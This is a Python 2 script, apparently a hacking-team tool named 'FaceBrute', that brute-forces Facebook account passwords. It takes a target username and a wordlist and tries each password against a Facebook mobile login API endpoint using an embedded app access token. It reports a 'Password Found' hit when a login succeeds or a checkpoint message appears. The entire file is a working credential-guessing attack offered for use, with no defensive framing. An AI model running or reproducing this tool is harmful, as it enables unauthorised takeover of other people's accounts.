#coded by Bl4ck Dr460n
"""Dilarang Recode Ya Bossq Saya Udh Cape2 Buat Tools Ini
Saya Tau Agan Bisa Buat Tools Sendiri, Agan Anggap Ini Sampah
Ini Cuma Tools Biasa Saja"""
import os,sys,time,urllib,json
try:
	import requests
except ImportError:
	os.system('pip2 install requests')
	menu()

GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan
logo = Y+"""
    ______                ____             __
   / ____/___ _________  / __ )_______  __/ /____
  / /_  / __ `/ ___/ _ \/ __  / ___/ / / / __/ _ \\
 / __/ / /_/ / /__/  __/ /_/ / /  / /_/ / /_/  __/
/_/    \__,_/\___/\___/_____/_/   \__,_/\__/\___/"""+B+" V0.1"""

def info():
	print R+"<[=================================]>"
	print R+"<["+G+" Author : BL4CK DR460N           "+R+"]>"
	print R+"<["+G+" Team   : Woll Cyber Team        "+R+"]>"
	print R+"<["+Y+"          Face Crack             "+R+"]>"
	print R+"<[=================================]>"

def menu():
	to = []
	print logo
	info()
	try:
		print
		usr = raw_input(W+"Username : "+G)
		pas = raw_input(W+"List Password : "+G)
		print
		print R+"[====================================]"
		ps = open(pas, 'r')
		for pwd in ps:
			try:
				p = pwd.replace('\n', '')
				sys.stdout.write(Y+"Trying Password > "+R+p+"\n")
				sys.stdout.flush()
				data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + p + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
				j = json.loads(data.text)
				if 'access_token' in j:
					print B+"=========="+G+"Password Found"+B+"=========="
					print W+" Email/Id/Username : "+G+usr
					print W+" Password          : "+G+p
					print
					sys.exit()
				elif 'www.facebook.com' in j['error_msg']:
					print B+"=========="+G+"Password Found"+B+"=========="
                        	        print W+" Email/Id/Username : "+Y+usr
                                	print W+" Password          : "+Y+p
	                                print
        	                        sys.exit()

			except requests.ConnectionError:
				print R+"Tidak Ada Koneksi"
				sys.exit()
	except IOError:
		print R+"File Not Found"
		sys.exit()

if __name__ == '__main__':
	menu()
